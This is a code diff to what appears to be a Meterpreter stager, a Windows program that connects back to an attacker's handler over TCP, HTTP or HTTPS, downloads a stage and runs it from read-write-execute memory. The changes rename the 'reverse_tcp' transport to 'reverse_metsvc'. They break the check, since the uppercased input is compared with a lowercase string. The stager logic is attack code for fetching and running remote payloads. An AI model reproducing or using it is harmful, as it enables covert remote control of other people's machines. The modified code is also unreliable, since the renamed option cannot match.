@@ -54,8 +54,8 @@ int wmain(int argc, wchar_t *argv[])
 	//If "-s" is specified (load stage from local file)
 	wchar_t StageFilePath[MAX_PATH] = {0};		// If the stage is going to be loaded from a dll file from the filesystem, path will be put here. 
 
-	// Reverse_TCP specific Variables
-	SOCKET ConnectSocket = INVALID_SOCKET;		// Socket ... will be used for reverse_tcp
+	// reverse_metsvc specific Variables
+	SOCKET ConnectSocket = INVALID_SOCKET;		// Socket ... will be used for reverse_metsvc
 
 	// HTTP(S) Specific Variables
 	char url[512] = {0};	//Full URL 
@@ -67,10 +67,10 @@ int wmain(int argc, wchar_t *argv[])
 	for (int i = 1; i < argc; i++) 
 	{
 		if (i != argc) // Check that we haven't finished parsing already
-			if (wcscmp(argv[i], L"-t") == 0) { //Transport; available options are REVERSE_TCP, REVERSE_HTTP, REVERSE_HTTPS ... case doesn't matter.
+			if (wcscmp(argv[i], L"-t") == 0) { //Transport; available options are reverse_metsvc, REVERSE_HTTP, REVERSE_HTTPS ... case doesn't matter.
 				payload_settings.TRANSPORT = argv[i + 1];
 				_wcsupr(payload_settings.TRANSPORT); // Wide-String-to-uppercase
-				if(wcscmp(payload_settings.TRANSPORT,L"REVERSE_TCP") == 0) 
+				if(wcscmp(payload_settings.TRANSPORT,L"reverse_metsvc") == 0) 
 				{
 					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
 				}
@@ -83,7 +83,7 @@ int wmain(int argc, wchar_t *argv[])
 					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_HTTPS";
 				}
 				else {
-					dprintf(L"[-] Unknown transport: \"%s\"\n[-] Valid transports are reverse_tcp, reverse_http and reverse_https.\n", payload_settings.TRANSPORT);
+					dprintf(L"[-] Unknown transport: \"%s\"\n[-] Valid transports are reverse_metsvc, reverse_http and reverse_https.\n", payload_settings.TRANSPORT);
 					exit(0);
 				}
 				// End of Transport checks
@@ -288,11 +288,11 @@ int wmain(int argc, wchar_t *argv[])
 		/*
 		*	Preparing connection...
 		*/
-		// Are we reverse_tcp?
+		// Are we reverse_metsvc?
 		if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_SSL") == 0)
 		{
 			// Adjusting buffer .. this is important!
-			// REVERSE_TCP has extra requirements ... the stage needs to be preceeded with `0xBF + 4 bytes of a valid socket connected to the handler` 
+			// reverse_metsvc has extra requirements ... the stage needs to be preceeded with `0xBF + 4 bytes of a valid socket connected to the handler` 
 			// My approach to acheive this: We'll first VirtualAlloc size + 5 bytes to another buffer "TempBuffer", skip 5 bytes, then copy the contents 
 			// of "buffer" over, then point buffer to that new TempBuffer ... then take it from there.
 			TempBuffer = (unsigned char*)VirtualAlloc(0, StageSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
